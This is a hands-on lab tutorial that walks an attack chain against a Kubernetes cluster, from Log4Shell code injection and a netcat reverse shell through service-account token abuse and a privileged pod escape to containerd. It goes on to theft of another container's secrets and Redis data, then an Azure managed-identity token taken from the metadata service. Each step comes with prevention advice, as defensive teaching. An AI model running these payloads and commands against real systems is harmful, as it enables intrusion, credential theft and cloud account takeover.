# Hijack Kubernetes Hands-on

## Hijack the container via Log4Shell

<details>
<summary>Show me the details</summary>

The sample application provides you with an login page. We will try to inject some code here. To do so we need to first prepare our attacker machine.

Execute the following snippet on your attacker machine (You have to update the IP address):

```bash
cd log4j-shell-poc

sudo python3 poc.py --userip 0.0.0.0 --webport 80 --lport 443 &
sudo nc -lvnp 443
```

We now try to inject into the container via a reverse shell by using the known Log4Shell [(CVE-2021-44228) vulnerability](https://en.wikipedia.org/wiki/Log4Shell).

Input value for the user name field (You have to update the IP address): `${jndi:ldap://0.0.0.0:1389/a}`

You can decide on the password. Then login.

You now have access to the container via a reverse shell.

<details>
<summary>How to prevent this attack</summary>

* Shift security left and enable [SAST scanning](https://owasp.org/www-community/Source_Code_Analysis_Tools)
* Build secure/small container images ([distroless](https://github.com/GoogleContainerTools/distroless), less is more)
* Do not run workload as root
* Deny egress network access on a network level as well as using [Kubernetes Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
* Detect untrusted process with container runtime security tools like [Falco](https://github.com/falcosecurity/falco)
* Use a Web Application Firewall

</details>
</details>

## Get access to the Kubernetes API

<details>
<summary>Show me the details</summary>

Let's see if we can access the API server. Execute the following snippets:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl --cacert ${CA} --header "Authorization: Bearer ${TOKEN}" -X GET https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT_HTTPS/api

NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
curl --cacert ${CA} --header "Authorization: Bearer ${TOKEN}" -X GET https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT_HTTPS/api/v1/namespaces/$NS/pods

curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod +x kubectl; mv kubectl /usr/bin/

kubectl get pods
kubectl get pods -A
kubectl get nodes

kubectl auth can-i create pod
```

<details>
<summary>How to prevent this attack</summary>

* Do not share service accounts between applications
* Do not enable higher access levels for the default service account (this app would not have needed it!)
* Review all third-party snippets before deploying them
* Use read-only filesystems
* Things we already talked about
  * Limit egress access to the internet
  * Use distroless and secure container images
  * Detect untrusted processes with container runtime security

</details>
</details>

## Hijack the Kubernetes Node

<details>
<summary>Show me the details</summary>

Let's try one more thing. Are we able to schedule a privileged pod and "talk" to containerd? Run the following snippets:

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
  namespace: default
spec:
  containers:
  - name: shell
    image: ubuntu:latest
    stdin: true
    tty: true
    volumeMounts:
    - mountPath: /mnt
      name: volume
    securityContext:
      privileged: true
  volumes:
  - name: volume
    hostPath:
      path: /run/containerd
EOF

kubectl exec -it -n default privileged-pod -- /bin/bash

apt-get update; apt-get install -y curl jq

curl -LO https://github.com/containerd/containerd/releases/download/v1.5.5/cri-containerd-cni-1.5.5-linux-amd64.tar.gz; tar -xvf cri-containerd-cni-1.5.5-linux-amd64.tar.gz

ctr --address /mnt/containerd.sock --namespace k8s.io container list

```

<details>
<summary>How to prevent this attack</summary>

* Deny running root containers (Tools like [OPA Gatekeeper](https://github.com/open-policy-agent/gatekeeper) and [Kyverno](https://github.com/kyverno/kyverno) can help)
* Deny hostPath mounts
* Things we already talked about
  * Do not share service accounts
  * Limit egress access to the internet
  * Use distroless and secure container images
  * Detect untrusted processes with container runtime security

</details>
</details>

## Access secrets and data from another container

<details>
<summary>Show me the details</summary>

We will now try to retrieve secrets from a container that we do not have access to (via Kubernetes):

```bash
id=$(ctr --address /mnt/containerd.sock --namespace k8s.io container list | grep "docker.io/library/nginx" | awk '{print $1}')

ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq .Spec.process.env
```


With those secret we can now connect to the Redis instance and retrieve some data:

```bash
apt-get install -y redis-tools

REDIS_HOST=$(ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq -r .Spec.process.env[] | grep REDIS_HOST | sed 's/^.*=//')
REDIS_KEY=$(ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq -r .Spec.process.env[] | grep REDIS_KEY | sed 's/^.*REDIS_KEY=//')

redis-cli -h $REDIS_HOST -a $REDIS_KEY get data
```

<details>
<summary>How to prevent this attack</summary>

* Limit egress access to other cloud resources (Network policies)
* Secure your other cloud resources
* Things we already talked about
  * Use distroless and secure container images
  * Detect untrusted processes with container runtime security
  * Deny running root containers (Tools like OPA Gatekeeper and Kyverno can help)
  * Deny hostPath mounts

</details>
</details>

## Hijack Cloud resources

<details>
<summary>Show me the details</summary>

We can also use the underlying cloud identity and try to escape even further. Run the following snippet to get a valid cloud provider token (in our case the Client ID of the underlying Managed Identity):

```bash
mkdir /temp
mount $(df | awk '{print $1}' | grep "/dev/sd") /temp

IDENTITY=$(cat /temp/etc/kubernetes/azure.json | jq -r .userAssignedIdentityID)

TOKEN=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?client_id='$IDENTITY'&api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq -r .access_token)

SUBSCRIPTION=$(cat /temp/etc/kubernetes/azure.json | jq -r .subscriptionId)
RG=$(cat /temp/etc/kubernetes/azure.json | jq -r .resourceGroup)

curl -X GET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://management.azure.com/subscriptions/$SUBSCRIPTION/resourcegroups/$RG?api-version=2021-04-01 | jq

STAC=my0stac
curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --data '{"sku":{"name":"Standard_LRS"},"kind":"StorageV2","location":"westeurope"}' https://management.azure.com/subscriptions/$SUBSCRIPTION/resourcegroups/$RG/providers/Microsoft.Storage/storageAccounts/$STAC?api-version=2018-02-01 | jq
```

To verify the created Storage Account we will now install the Azure CLI, authenticate and then list it:

```bash
curl -sL https://aka.ms/InstallAzureCLIDeb | bash

az login --identity --username $IDENTITY

az storage account list -g $RG -o table
```

<details>
<summary>How to prevent this attack</summary>

* Deny access to the Cloud provider metadata service using Network Policies (all Cloud providers!)
* Things we already talked about
  * Deny priviledged containers, host path mounts and other security related settings via Policies
  * Use distroless and secure container images
  * Detect untrusted processes with container runtime security

</details>
</details>
